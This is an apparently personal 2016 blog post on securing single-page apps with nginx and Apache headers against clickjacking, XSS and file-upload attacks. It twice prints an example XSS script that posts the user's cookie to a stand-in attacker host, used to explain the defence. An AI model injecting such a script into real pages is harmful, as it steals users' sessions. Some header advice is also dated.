---
layout: post
title: Secure Single Page Application for Nginx and Apache
date: 2016-03-20
comments: true
categories: [nginx, apache, security, spa]
tags: [nginx, apache, security, spa]
excerpt_separator: <!-- more -->
---

Single Page Application (SPA) is pretty easy to deploy on nginx or apache server. However, after deploying, we would need to add a few things so that our application can be more secured to some possible attacks. In this article, I am going to go through some of the security threat that I know and the solution to prevent those threats in nginx and apache server.
<!-- more -->

## Clickjacking attack

Clickjacking, also known as a "UI redress attack", is when an attacker uses multiple transparent or opaque layers to trick a user into clicking on a button or link on another page when they were intending to click on the the top level page. Thus, the attacker is "hijacking" clicks meant for their page and routing them to another page, most likely owned by another application, domain, or both. (reference [Wikipedia](https://www.owasp.org/index.php/Clickjacking))

Hence, someone can use an iframe and source your SPA app into its iframe and trick user to click on the buttons inside the SPA app to redirect user into another page controlled by the hacker. In this page, user is asked to fill in username/email & password without knowing that the page is not part of the original SPA app.

To prevent this from happening, you would need set ``X-Frame-Options`` header to be one of the following values:

- __SAMEORIGIN__: Your SPA app would be able to be loaded in iframe/frame on the same origin as the page itself.
- __DENY__: Your SPA app would not be loaded in frame or frame.
- __ALLOW-FROM uri__: Your SPA app would be able to be loaded in iframe/frame on a page origined from the specified uri only.

### Apache

Put this line inside your ``httpd.conf`` or relevant file:

{% highlight bash %}
<IfModule mod_headers.c>
  Header set X-Frame-Options "SAMEORIGIN"

  # If you want to completely disable
  # the app to be iframed, set its to deny
  # Header set X-Frame-Options "DENY"

  # if you want to allow the app
  # to be iframed in certain URI only
  # Header set X-Frame-Options "ALLOW-FROM https://www.some-site.com"
</IfModule>
{% endhighlight %}

### Nginx

Put this line inside your ``sites-available`` nginx config file

{% highlight bash %}
add_header X-Frame-Options "SAMEORIGIN";

# If you want to completely disable
# the app to be iframed, set its to deny
# add_header X-Frame-Options "DENY";

# if you want to allow the app
# to be iframed in certain URI only
# add_header X-Frame-Options "ALLOW-FROM https://www.some-site.com";

{% endhighlight %}

After adding the line, you can restart apache/nginx server and verify by reloading the page and check the response header. Make sure ``X-Frame-Options`` setting match with what you have changed in your server configuration.

<p style='text-align:center;' markdown='1'><img src='/public/images/x_frame_option.png' alt="X-Frame-Options" style='display:inline;'/></p>

## Cross-site scripting (XSS) attack

Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted web sites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.(reference [Wikipedia](https://www.owasp.org/index.php/Cross-site_scripting))

An example of this kind of attack is when an application does not validate user's input data and let the following kind of code in posted input (post, private message, etc...) displayed to other logged in users:

{% highlight html %}
<script type="text/javascript">
// attacker secretly sends back the user cookie to his server.
// The cookie can then be later used to login the attacked user's account without being noticed.
$.post('https://attacker-url.com', { cookie: document.cookie });
</script>
{% endhighlight %}

To prevent this from happening, you would need set ``X-XSS-protection`` header to be ``1; mode=block``

### Apache

Put this line inside your ``httpd.conf`` or relevant file:

{% highlight bash %}
<IfModule mod_headers.c>
  Header set X-XSS-protection: "1; mode=block"
</IfModule>
{% endhighlight %}

### Nginx

Put this line inside your ``sites-available`` nginx config file

{% highlight bash %}
add_header X-XSS-Protection "1; mode=block";
{% endhighlight %}

After adding the line, you can restart apache/nginx server and verify by reloading the page and check the response header. Make sure ``X-XSS-Protection`` setting match with what you have changed in your server configuration.


<p style='text-align:center;' markdown='1'><img src='/public/images/x_xss_protection_option.png' alt="X-XSS-Protection" style='display:inline;'/></p>

## Unrestricted File Upload attack

In this kind of attack, hacker can upload a malicious file and when the app serve the uploaded file to othe users, the uploaded file can executed. This is made possible by browser which tries to sniff the MIME type f of the file and execute the file without being explicitly asked to do so.

For instance, attacker can upload a HTML file containing javascript code

{% highlight html %}
<script type="text/javascript">
// attacker secretly sends back the user cookie to his server.
// The cookie can then be later used to login the attacked user's account without being noticed.
$.post('https://attacker-url.com', { cookie: document.cookie });
</script>
{% endhighlight %}

And later on, an ``a`` tag with ``href`` linking to display the content of this HTML file is shown to user. If user clicks on this link, browser would try to interpret displayed file extension as HTML code and try to execute it right away. As a result, user's cookie would be sent over to the attacker's server. This leads to a case of ``Cross-site Scripting (XSS)`` attack.

To prevent this from happening, you would need set ``X-Content-Type-Options`` header to be ``nosniff``. Hence if server instructs the served file to be ``Content-Type: text/plain``, browser would serve the file as plain text only instead of trying to execute the file based on its MIME extension.

### Apache

Put this line inside your ``httpd.conf`` or relevant file:

{% highlight bash %}
<IfModule mod_headers.c>
  Header set X-Content-Type-Options "nosniff"
</IfModule>
{% endhighlight %}

### Nginx

Put this line inside your ``sites-available`` nginx config file

{% highlight bash %}
add_header X-Content-Type-Options "nosniff";
{% endhighlight %}

After adding the line, you can restart apache/nginx server and verify by reloading the page and check the response header. Make sure ``X-Content-Type-Options`` setting match with what you have changed in your server configuration.

<p style='text-align:center;' markdown='1'><img src='/public/images/x_content_type_options.png' alt="X-Content-Type-Options" style='display:inline;'/></p>

## Conclusion

In this article, I have outlined the 3 possible attacks that can happen on a SPA application:

- Clickjacking attack
- Cross-site scripting (XSS) attack
- Unrestricted File Upload attack

As a result, it's important to have the following HTTP headers set with approriate values to prevent those attacks:

- X-Frame-Options
- X-XSS-Protection
- X-Content-Type-Options

I hope you found this article helpful. Please consider sharing this article so that other developers can be beneficial from these information as well :-)
